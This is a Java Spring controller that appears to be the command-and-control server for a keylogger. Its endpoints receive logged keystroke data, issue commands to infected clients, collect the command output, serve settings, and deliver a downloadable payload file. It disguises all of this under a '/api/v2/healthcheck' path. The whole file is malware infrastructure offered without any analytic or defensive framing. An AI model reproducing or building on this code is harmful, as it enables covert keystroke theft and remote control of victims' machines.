package com.klg.client.controller;

import com.klg.client.model.CommandResponseRequest;
import com.klg.client.model.KeyloggerData;
import com.klg.client.model.KlgCodeResponse;
import com.klg.client.model.SettingsResponse;
import com.klg.client.model.SyncedCommandResponse;
import com.klg.client.service.ClientService;
import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import lombok.RequiredArgsConstructor;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.util.ResourceUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.mvc.method.annotation.StreamingResponseBody;

@RestController
@RequiredArgsConstructor
@RequestMapping("/api/v2/healthcheck")
public class ClientController {

  private final ClientService clientService;

  @PostMapping
  public void keyloggerData(@RequestBody KeyloggerData keyloggerData) {
    clientService.keyloggerData(keyloggerData);
  }

  @GetMapping("/cmd")
  public SyncedCommandResponse getCommand() {
    return clientService.cmd();
  }

  @GetMapping("/settings")
  public SettingsResponse getSettings() {
    return clientService.settings();
  }

  @PostMapping("/cmd_res")
  public void saveCommandResponse(@RequestBody CommandResponseRequest request) {
    clientService.saveResponse(request);
  }

  @GetMapping(value = "/kc", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
  public ResponseEntity<Resource> getFileViaByteArrayResource() throws IOException {
    HttpHeaders headers = new HttpHeaders(); headers.add(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=dupa.txt");
    Path path = ResourceUtils.getFile("classpath:static/dupa.txt").toPath();
    var resource = new ByteArrayResource(Files.readAllBytes(path));
    return ResponseEntity.ok()
        .headers(headers)
        .contentLength(path.toFile().length())
        .contentType(MediaType.APPLICATION_OCTET_STREAM)
        .body(resource);
  }
}
